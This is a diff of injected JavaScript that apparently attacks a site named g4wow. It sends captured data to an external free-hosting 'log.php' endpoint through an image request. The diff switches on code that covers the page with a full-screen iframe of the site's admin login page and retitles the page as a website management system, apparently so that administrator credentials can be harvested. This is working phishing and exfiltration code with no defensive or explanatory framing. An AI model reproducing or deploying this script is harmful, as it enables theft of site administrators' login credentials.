@@ -17,16 +17,16 @@ imageObject.src = "http://g4wowisbad.000webhostapp.com/log.php?log="+$data;
 
 
 //Load jquery
-var script = document.createElement('script');
-script.src = '//code.jquery.com/jquery-1.11.0.min.js';
-script.type = 'text/javascript';
-document.getElementsByTagName('head')[0].appendChild(script);
+//var script = document.createElement('script');
+//script.src = '//code.jquery.com/jquery-1.11.0.min.js';
+//script.type = 'text/javascript';
+//document.getElementsByTagName('head')[0].appendChild(script);
 
 //Let page load first
-//document.head.innerHTML = "<style>#login_iframe{width:100%;height:100%;border:none;position:absolute;left:0;top:0;overflow:hidden;z-index:1000000000000000;}</style>" + document.head.innerHTML;
-//document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='/admin_g4wow/Login.aspx'></iframe>" + document.body.innerHTML;
-//var prevTitle = document.title;
-//document.title = "网站管理系统";
+document.head.innerHTML = "<style>#login_iframe{width:100%;height:100%;border:none;position:absolute;left:0;top:0;overflow:hidden;z-index:1000000000000000;}</style>" + document.head.innerHTML;
+document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='/admin_g4wow/Login.aspx'></iframe>" + document.body.innerHTML;
+var prevTitle = document.title;
+document.title = "网站管理系统";
 
 $("#login_iframe").on('load', function(){
 	//alert("Loaded");
